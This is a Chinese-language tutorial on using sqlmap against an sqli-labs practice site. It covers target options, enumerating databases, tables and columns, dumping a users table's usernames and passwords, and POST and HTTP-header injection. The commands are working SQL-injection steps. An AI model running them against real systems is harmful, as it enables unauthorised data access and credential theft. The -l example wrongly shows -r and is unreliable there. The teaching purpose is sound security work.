什么是sqlmap

02

   sqlmap是一个用来检测与利用SQL注入漏洞的免费开源工具。sqlmap是采用python编写的一款工具，这也就是说你的电脑需要安装python环境，python2和python3都可以支持。如果大家想在windows中使用sqlmap，我们可以安装好python环境以后，把sqlmap下载下来，然后给sqlmap配置一个环境变量，这样我们就可以直接在cmd中运行sqlmap了。sqlmap下载：http://sqlmap.org/

sqlmap配置环境变量

    去sqlmap文件夹中找到sqlmap.py，然后复制当前绝对路径，右键我的电脑-》属性-》高级系统设置-》环境变量-》系统环境变量-》path-》双击进去，新建-》将复制的绝对路径粘贴。保存即可


sqlmap帮助以及确定目标

03

sqlmap帮助

sqlmap.py -h          显示基本帮助信息

sqlmap.py -hh        显示高级帮助信息

sqlmap确定目标

sqlmap.py -u  一般用于测试get请求类型

示例：

sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-1/?id=1

sqlmap.py -m  一般用于测试多个get类型请求的注入点

使用方式：将需要测试的url放入文本文档中，然后通过-m指定该文件,它测试完第一个url后会询问你是否测试第二个url，以此类推，直到测试完所有url。

示例：

sqlmap.py  -m "F:\desktop\test.txt"

sqlmap.py -r    一般用于post类型请求以及http头部注入

使用方式：使用burpsuite把请求的数据包拦截，然后把数据表复制到文本文档中，通过-r指定文件

示例：

sqlmap.py -r "F:\desktop\test.txt"

sqlmap.py -l 主要通过http请求日志来进行批量SQL注入测试

使用方式：打开burpsuite的Project options模块，选择misc,找到Logging选项，勾选proxy后面的requests选项，然后指定一个目录文件即可。然后你就可以把浏览器的代理打开，burpsuit的拦截打开，然后去访问想要测试的网址即可，然后你的请求日志就会记录到刚刚设置的文件中。这个测试过程中也会提示你每个请求是否需要测试。

示例：

sqlmap.py -r "F:\desktop\request_log"


sqlmap基础拿数据

04

确认是否存在注入

sqlmap.py -uhttp://www.anantest.com:8092/sqlilabs/Less-6/?id=1

获取当前数据库名

--current-db    查询当前数据库名

sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-6/?id=1  --current-db


查询当前数据库中的所有表

-D指定查询出的数据库名   --table查询指定数据库的数据表名

sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-6/?id=1  -D security --tables

查询指定数据库中指定表的字段

-T 指定表名   --columns查询指定表的字段

sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-6/?id=1  -D security -T users --columns

查询指定数据库指定表的数据

-C指定字段名   --dump查询数据（会保存到电脑上）

sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-6/?id=1  -D security -T users -C id,username,password --dump

sqlmap之POST注入和http头部注入

05

sqlmap之post注入

sqlmap -u url --data     通过--data指定post参数，然后判断是否存在注入

示例：sqlmap.py -u http://www.anantest.com:8092/sqlilabs/Less-12/ --data="uname=123&passwd=456"

sqlmap.py -r "F:\desktop\test.txt"

sqlmap之http头部注入

不管是referer、cookie、user-agent等http头部都可以通过此方法测试。接下来通过测试user-agent是否存在注入来演示。使用*标记user-agent的值，然后使用--skip跳过不想测试的参数。

示例：sqlmap.py -r "F:\desktop\test.txt" --skip uname,passwd
